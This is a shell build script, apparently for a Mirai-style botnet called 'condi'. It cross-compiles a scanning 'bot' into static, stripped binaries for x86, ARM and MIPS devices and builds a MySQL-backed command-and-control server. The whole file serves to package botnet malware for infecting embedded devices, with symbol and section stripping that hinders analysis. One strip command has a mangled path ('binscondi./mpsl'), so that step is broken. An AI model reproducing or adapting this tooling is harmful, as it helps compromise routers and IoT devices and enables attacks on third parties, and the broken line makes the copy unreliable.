#!/bin/sh

compiler_dir="/etc/xcompile/"
compiler_flags="-DIPV4"

rm -rf bins
mkdir bins
gcc bot/*.c -DDEBUG -DSCANNER -DIPV4 -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o tester
strip tester -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}i586/bin/i586-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.x86
${compiler_dir}i586/bin/i586-strip bins/condi.x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}x86_64/bin/x86_64-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.x86_64
${compiler_dir}x86_64/bin/x86_64-strip bins/condi.x86_64 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv7l/bin/armv7l-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.arm7
${compiler_dir}armv7l/bin/armv7l-strip bins/condi.arm7 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv5l/bin/armv5l-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.arm5
${compiler_dir}armv5l/bin/armv5l-strip bins/condi.arm5 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}armv4l/bin/armv4l-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.arm4
${compiler_dir}armv4l/bin/armv4l-strip bins/condi.arm4 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}mips/bin/mips-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.mips
${compiler_dir}mips/bin/mips-strip bins/condi.mips -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
${compiler_dir}mipsel/bin/mipsel-gcc bot/*.c ${compiler_flags} -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bins/condi.mpsl
${compiler_dir}mipsel/bin/mipsel-strip binscondi./mpsl -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

echo "build cnc"
gcc cnc/*.c -o server -DDEBUG -lpthread $(mysql_config --libs)
echo "done"